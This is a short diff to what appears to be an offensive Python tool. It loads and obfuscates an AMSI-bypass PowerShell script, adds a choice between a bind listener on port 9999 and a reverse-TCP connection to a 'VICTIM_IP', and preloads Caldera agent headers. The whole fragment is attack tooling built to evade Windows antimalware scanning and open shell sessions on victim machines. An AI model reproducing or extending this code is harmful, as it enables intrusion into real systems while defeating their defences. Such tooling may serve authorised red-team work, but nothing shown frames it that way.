@@ -8,8 +8,14 @@ from utility import decor
 amsi_bypass_init = open(f'{payload_dir}/amsi_bypass.ps1','r').read().split('\n')
 amsi_bypass_lst = translator.preset_obfuscation(bypasslevel,amsi_bypass_init)
 
-c = connect(VICTIM_IP,VICTIM_PORT)
-c.recv()
+
+if listen_tcp:
+    c = listen(9999,'0.0.0.0')
+    c.recv()
+
+elif reverse_tcp:
+    c = connect(VICTIM_IP,VICTIM_PORT)
+    c.recv()
 
 ## preloaded information
 win_caldera_headers = '{"platform"="windows";"file"="manx.go"}'
